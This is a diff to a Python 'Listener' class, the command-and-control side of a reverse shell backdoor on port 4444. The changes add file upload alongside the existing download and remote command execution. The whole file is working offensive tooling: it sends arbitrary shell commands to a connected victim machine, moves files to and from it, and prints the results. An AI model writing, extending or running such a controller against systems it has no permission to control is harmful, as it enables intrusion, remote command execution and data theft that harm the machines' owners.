@@ -1,6 +1,6 @@
 import socket, json
 import termcolor
-import base64
+import base64 
 
 
 class Listener:
@@ -28,8 +28,7 @@ class Listener:
 
 	def execute_remotely(self, command):
 		self.reliable_send(command)
-		command = command.split()
-		if command[0] == "exit":
+		if command.split()[0] == "exit":
 			self.connection.close()
 			exit()
 		return self.reliable_recive()
@@ -39,17 +38,27 @@ class Listener:
 		with open(path, "wb") as file:
 			file.write(content)
 			print("[+] Download succsessful")
+
+	def read_file(self, path):
+		file = open(path, "rb").read()
+		file = base64.encodebytes(file).decode('utf-8')
+		return file
 	
 	def run(self):
 		while True:
 			command = input(termcolor.colored("user $ ", "cyan"))
-			result = self.execute_remotely(command)
+
+			if command.split()[0] == 'upload':
+				file_content = self.read_file(command.split()[1])
+				command += " " + file_content
+				result = self.execute_remotely(command)
+			else:
+				result = self.execute_remotely(command)
 			
 			if command.split()[0] == "download":
-				command = command.split()
-				self.write_file(command[1], result)
-			else:
-				print(result)
+				self.write_file(command.split()[1], result)
+
+			print(result)
 
 my_listener = Listener("localhost", 4444)
 my_listener.run()
